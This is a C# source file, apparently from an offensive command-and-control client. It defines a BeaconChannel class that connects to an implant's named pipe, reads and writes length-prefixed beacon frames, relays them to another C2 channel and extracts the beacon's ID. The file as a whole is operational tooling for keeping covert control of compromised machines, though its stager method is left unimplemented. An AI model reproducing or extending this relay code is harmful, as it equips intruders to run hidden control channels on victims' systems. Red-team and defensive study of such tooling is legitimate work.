using System;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using ClientC2.interfaces;

namespace ClientC2.channels
{
    public class BeaconChannel : IC2Channel
    {
        private const int MaxBufferSize = 1024 * 1024;

        public BeaconChannel()
        {
        }
        public BeaconChannel(Guid pipeName)
        {
            SetPipeName(pipeName);
        }
        public int ExternalId { get; private set; }

        public Guid PipeName { get; private set; }

        public NamedPipeClientStream Client { get; private set; }

        public bool Connected => Client?.IsConnected ?? false;

        public bool Connect()
        {
            Client = new NamedPipeClientStream(PipeName.ToString());

            var tries = 0;
            while (Client.IsConnected == false)
            {
                if (tries == 20) break;

                Client.Connect();
                tries += 1;

                Thread.Sleep(1000);
            }

            return Client.IsConnected;
        }
        public void Close()
        {
            Client.Close();
        }

        public void Dispose()
        {
            Client.Close();
        }
        public byte[] ReadFrame()
        {
            var reader = new BinaryReader(Client);
            var bufferSize = reader.ReadInt32();
            var size = bufferSize > MaxBufferSize
                ? MaxBufferSize
                : bufferSize;

            return reader.ReadBytes(size);
        }
        public void SendFrame(byte[] buffer)
        {
            var writer = new BinaryWriter(Client);

            writer.Write(buffer.Length);
            writer.Write(buffer);
        }
        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0)
                return false;

            if (ExternalId == 0 && buffer.Length == 132)
                ExtractId(buffer);

            c2.SendFrame(buffer);

            return true;
        }
        public void SetPipeName(Guid pipeName)
        {
            PipeName = pipeName;
        }
        private void ExtractId(byte[] frame)
        {
            using (var reader = new BinaryReader(new MemoryStream(frame)))
                ExternalId = reader.ReadInt32();

            Console.WriteLine($"[+] Extracted External Beacon Id: {ExternalId}");
        }

        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
    
            throw new NotImplementedException();
        }
    }
}
